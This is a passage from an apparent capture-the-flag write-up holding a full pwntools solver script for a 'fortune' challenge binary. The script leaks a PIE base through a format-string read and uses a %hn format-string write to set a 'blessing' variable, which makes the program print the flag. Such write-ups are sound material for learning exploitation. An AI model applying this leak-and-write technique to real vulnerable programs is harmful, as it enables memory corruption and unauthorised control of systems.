        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\nfrom pathlib import Path\nfrom pwn import *\n\nBASE_DIR = Path(__file__).resolve().parent\nBINARY_PATH = BASE_DIR / \"fortune\"\n\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\ncontext.log_level = \"info\"\n\nPIE_LEAK_INDEX = 37\nPIE_LEAK_DELTA = 0x1441\nBLESSING_VALUE = 0x1337\n\n\ndef start():\n    if args.REMOTE:\n        host = args.HOST or \"fortune-teller-2f07862f8222.inst15.ctf.fortid.com\"\n        port = int(args.PORT or 1337)\n        return remote(host, port, ssl=True, sni=host)\n\n    if args.GDB:\n        return gdb.debug([str(BINARY_PATH)], gdbscript=\"\"\"\n            set pagination off\n            continue\n        \"\"\")\n\n    return process([str(BINARY_PATH)], cwd=str(BASE_DIR))\n\n\ndef ask(io, question):\n    io.sendlineafter(b\"> \", b\"1\")\n    io.sendlineafter(b\"> \", question)\n    io.recvuntil(b\"The oracle speaks:\\n\")\n    return io.recvline()\n\n\ndef leak_pie(io):\n    raw = ask(io, f\"%{PIE_LEAK_INDEX}$p\".encode()).strip()\n    try:\n        leak = int(raw, 16)\n    except ValueError as exc:\n        raise RuntimeError(f\"PIE leak tidak valid: {raw!r}\") from exc\n\n    base = leak - PIE_LEAK_DELTA\n    if base & 0xfff:\n        raise RuntimeError(f\"PIE base tidak page-aligned: {base:#x}\")\n    log.info(\"PIE leak: %#x\", leak)\n    log.info(\"PIE base: %#x\", base)\n    return base\n\n\ndef write_blessing(io, base):\n    target = base + elf.sym[\"blessing\"]\n\n    # The first stack-backed variadic argument is slot 6. Put the target\n    # after an 8-byte-aligned format string and calculate its slot dynamically.\n    target_slot = 6\n    for _ in range(4):\n        fmt = f\"%1${BLESSING_VALUE}c%{target_slot}$hn\".encode()\n        fmt = fmt.ljust((len(fmt) + 7) & ~7, b\"A\")\n        new_slot = 6 + len(fmt) // 8\n        if new_slot == target_slot:\n            break\n        target_slot = new_slot\n    else:\n        raise RuntimeError(\"gagal menentukan slot alamat format string\")\n\n    assert len(fmt) % 8 == 0\n    payload = fmt + p64(target)\n\n    log.info(\"blessing target: %#x\", target)\n    log.info(\"format target slot: %d\", target_slot)\n    ask(io, payload)\n\n\ndef exploit(io):\n    base = leak_pie(io)\n    write_blessing(io, base)\n\n    io.sendlineafter(b\"> \", b\"2\")\n    result = io.recvuntil(b\"\\n\", timeout=3)\n    log.info(\"blessing response: %s\", result.rstrip().decode(errors=\"replace\"))\n    if b\"The stars are aligned.\" not in result:\n        raise RuntimeError(\"blessing tidak berhasil; primitive write gagal\")\n\n    # win() prints the flag and then returns. Keep the rest of its output.\n    output = io.recvall(timeout=3)\n    print(output.decode(errors=\"replace\"), end=\"\")\n\n\ndef main():\n    io = start()\n    try:\n        exploit(io)\n    finally:\n        io.close()\n\n\nif __name__ == \"__main__\":\n    main()"
